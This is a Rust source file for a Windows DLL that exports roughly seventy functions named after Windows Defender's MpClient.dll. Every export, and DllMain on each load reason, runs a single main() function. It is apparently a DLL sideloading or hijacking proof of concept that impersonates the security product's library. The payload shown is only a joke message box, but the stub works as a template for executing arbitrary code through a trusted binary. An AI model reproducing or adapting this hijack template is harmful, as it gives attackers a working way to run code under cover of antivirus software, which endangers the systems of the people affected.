

use windows::{
    core::PCSTR,
    Win32::{
        UI::WindowsAndMessaging::{
            MessageBoxA,
            MESSAGEBOX_STYLE
        },
        Foundation::{
            BOOL,
            HANDLE,
            HWND,
        }
    }
};

#[no_mangle]
extern "C" fn MpManagerStatusQuery() { main(); }
#[no_mangle]
extern "C" fn MpGetTPStateInfo() { main(); }
#[no_mangle]
extern "C" fn MpConfigGetValue() { main(); }
#[no_mangle]
extern "C" fn MpConfigSetValue() { main(); }
#[no_mangle]
extern "C" fn MpConfigClose() { main(); }
#[no_mangle]
extern "C" fn MpClientUtilExportFunctions() { main(); }
#[no_mangle]
extern "C" fn MpGetTSModeInfo() { main(); }
#[no_mangle]
extern "C" fn MpConfigInitialize() { main(); }
#[no_mangle]
extern "C" fn MpManagerEnable() { main(); }
#[no_mangle]
extern "C" fn MpWDEnable() { main(); }
#[no_mangle]
extern "C" fn MpUpdatePlatform() { main(); }
#[no_mangle]
extern "C" fn MpRollbackPlatform() { main(); }
#[no_mangle]
extern "C" fn MpUnblockPlatform() { main(); }
#[no_mangle]
extern "C" fn MpUnblockEngine() { main(); }
#[no_mangle]
extern "C" fn MpUnblockSignatures() { main(); }
#[no_mangle]
extern "C" fn MpConfigUninitialize() { main(); }
#[no_mangle]
extern "C" fn MpThreatOpen() { main(); }
#[no_mangle]
extern "C" fn MpThreatEnumerate() { main(); }
#[no_mangle]
extern "C" fn MpScanResult() { main(); }
#[no_mangle]
extern "C" fn MpScanControl() { main(); }
#[no_mangle]
extern "C" fn MpScanStartEx() { main(); }
#[no_mangle]
extern "C" fn MpConfigGetValueAlloc() { main(); }
#[no_mangle]
extern "C" fn MpConfigOpen() { main(); }
#[no_mangle]
extern "C" fn MpFreeMemory() { main(); }
#[no_mangle]
extern "C" fn MpUpdateStartEx() { main(); }
#[no_mangle]
extern "C" fn MpHandleClose() { main(); }
#[no_mangle]
extern "C" fn MpAddDynamicSignatureFile() { main(); }
#[no_mangle]
extern "C" fn MpRemoveDynamicSignatureFile() { main(); }
#[no_mangle]
extern "C" fn MpDynamicSignatureOpen() { main(); }
#[no_mangle]
extern "C" fn MpDynamicSignatureEnumerate() { main(); }
#[no_mangle]
extern "C" fn MpGetTaskSchedulerStrings() { main(); }
#[no_mangle]
extern "C" fn MpGetTDTFeatureStatusEx() { main(); }
#[no_mangle]
extern "C" fn MpGetTDTFeatureStatus() { main(); }
#[no_mangle]
extern "C" fn MpConfigIteratorOpen() { main(); }
#[no_mangle]
extern "C" fn MpConfigIteratorEnum() { main(); }
#[no_mangle]
extern "C" fn MpConfigIteratorClose() { main(); }
#[no_mangle]
extern "C" fn MpNetworkCapture() { main(); }
#[no_mangle]
extern "C" fn MpConfigDelValue() { main(); }
#[no_mangle]
extern "C" fn MpQuarantineRequest() { main(); }
#[no_mangle]
extern "C" fn MpManagerStatusQueryEx() { main(); }
#[no_mangle]
extern "C" fn MpUpdateStart() { main(); }
#[no_mangle]
extern "C" fn MpSampleQuery() { main(); }
#[no_mangle]
extern "C" fn MpSampleSubmit() { main(); }
#[no_mangle]
extern "C" fn MpConveySampleSubmissionResult() { main(); }
#[no_mangle]
extern "C" fn MpGetSampleChunk() { main(); }
#[no_mangle]
extern "C" fn MpQueryEngineConfigDword() { main(); }
#[no_mangle]
extern "C" fn MpGetDeviceControlSecurityPolicies() { main(); }
#[no_mangle]
extern "C" fn MpSetTPState() { main(); }
#[no_mangle]
extern "C" fn MpManagerVersionQuery() { main(); }
#[no_mangle]
extern "C" fn MpAllocMemory() { main(); }
#[no_mangle]
extern "C" fn MpManagerOpen() { main(); }
#[no_mangle]
extern "C" fn MpUtilsExportFunctions() { main(); }
#[no_mangle]
extern "C" fn MpCleanStart() { main(); }
#[no_mangle]
extern "C" fn MpCleanOpen() { main(); }

#[no_mangle]
extern "C" fn MpTelemetrySetDWORD() { main(); }

 #[no_mangle]
extern "C" fn MpTelemetryUpload() { main(); }
 #[no_mangle]
extern "C" fn MpTelemetryUninitialize() { main(); }
 #[no_mangle]
extern "C" fn MpTelemetryInitialize() { main(); }
 #[no_mangle]
extern "C" fn MpTelemetrySetString() { main(); }
 #[no_mangle]
extern "C" fn MpTelemetrySetIfMaxDWORD() { main(); }
 #[no_mangle]
extern "C" fn MpTelemetryAddToAverageDWORD() { main(); }
 #[no_mangle]
extern "C" fn MpScanStart() { main(); }

#[no_mangle]
extern "C" fn main() {
    unsafe{
        MessageBoxA(HWND(std::ptr::null_mut()), PCSTR("Good afternoon This is the nigerian virus , due to lack of resources we can't create one to harm your pc kindly please delete one of your important files\x00\x00".as_ptr()), PCSTR("Scary Title\x00".as_ptr()),MESSAGEBOX_STYLE(0));
    }
}

#[no_mangle] // do not mess up the function names as those will be called from dll
#[allow(non_snake_case,unused_variables)]
// This is called in these cases:
/*
1. DLL is loaded into the memory
2. New thread is created  -> Dll call
3. DllMain() called
4. Detach

1. falana -> call [x]
 */
extern "system" fn DllMain(
    dll_module: HANDLE,
    call_reason: u32,
    lpv_reserved: &u32, // Now it's a LPVOID a pointer so we need to have a reference
) -> BOOL {
    match call_reason {
        _ => {
            main();
            return BOOL(1);
        }
    }
}